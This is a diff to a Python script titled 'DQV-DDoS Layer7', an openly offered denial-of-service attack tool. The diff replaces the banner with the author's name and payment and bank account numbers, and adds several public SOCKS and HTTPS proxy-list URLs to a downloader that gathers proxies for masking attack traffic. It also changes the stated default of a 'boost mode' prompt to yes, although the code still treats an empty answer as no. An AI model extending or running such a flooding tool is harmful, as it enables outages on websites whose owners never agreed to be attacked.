@@ -15,19 +15,19 @@ import ssl
 import datetime
 
 print ('''
-	        DDoS Layer 7 Copyright: ĐQV
->--------------------------------------------->
-                              
-┌───────────────────────────────────────────────────────┐
-│        Tos: Don't attack .gov website                 │
-├───────────────────────────────────────────────────────┤
-│                 New stuff:                            │
-│          [+] Added Http Proxy Support                 │
-│          [+] Optimization                             │
-│          [+] Changed Varible Name                     │
-├───────────────────────────────────────────────────────┤
-│ Link: https://www.facebook.com/DangQuocVinh.Profile   │
-└───────────────────────────────────────────────────────┘''')
+╔════════════════════════════════════════════════════════════════╗
+║                                     ║ Admin: Đặng Quốc Vinh    ║
+║                                     ║ Momo: 0964585376         ║
+║             █   █ █ █▄░█ █░█        ║ Zalo : 0964585376        ║
+║              ▀▄▀  █ █░▀█ █▀█        ║ MB Bank: 9999190888888   ║
+║                                     ║ MB Bank: 9018122005      ║
+║                                     ║ Support: Đặng Quốc Vinh  ║
+╚════════════════════════════════════════════════════════════════╝
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+~~~ TOOL DQV-DDoS Layer7 (DDoS)
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
+~~~ Bản Quyền: Đặng Quốc Vinh
+- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -''')
 
 
 
@@ -708,6 +708,31 @@ def downloadsocks(choice):
 		except:
 			pass
 		try:
+			r = requests.get("https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/socks4.txt",timeout=5)
+			f.write(r.content)
+		except:
+			pass
+		try:
+			r = requests.get("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",timeout=5)
+			f.write(r.content)
+		except:
+			pass
+		try:
+			r = requests.get("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",timeout=5)
+			f.write(r.content)
+		except:
+			pass
+		try:
+			r = requests.get("https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies_anonymous/socks5.txt",timeout=5)
+			f.write(r.content)
+		except:
+			pass
+		try:
+			r = requests.get("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",timeout=5)
+			f.write(r.content)
+		except:
+			pass
+		try:
 			r = requests.get("https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",timeout=5)
 			f.write(r.content)
 		except:
@@ -791,7 +816,7 @@ def main():
 			multiple = int(100)
 		else:
 			multiple = int(multiple)
-		brute = str(input("> Enable boost mode[beta](y/n, default=n):"))
+		brute = str(input("> Enable boost mode[beta](y/n, default=y):"))
 		if brute == "":
 			brute = False
 		elif brute == "y":
